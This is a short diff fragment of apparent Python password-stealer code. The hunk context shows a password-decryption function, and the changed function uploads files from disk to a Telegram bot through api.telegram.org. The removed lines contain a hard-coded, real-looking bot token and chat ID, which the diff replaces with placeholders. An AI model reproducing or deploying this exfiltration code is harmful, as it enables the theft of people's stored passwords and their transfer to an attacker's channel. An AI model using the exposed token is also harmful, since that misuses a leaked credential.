@@ -40,8 +40,8 @@ def password_decryption(password, encryption_key):
             return "No Passwords"
 
 def send_telegram_document(document_path, caption=""):
-    bot_token = "7076974857:AAH2nRGo9IN9P5g-fo19PFlc-znBfgGVzl4"
-    chat_id = "-1002043772522"
+    bot_token = "YOUR_CHAT_TOKEN"
+    chat_id = "YOUR_CHAT_ID"
     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
     files = {'document': open(document_path, 'rb')}
     payload = {"chat_id": chat_id, "caption": caption}
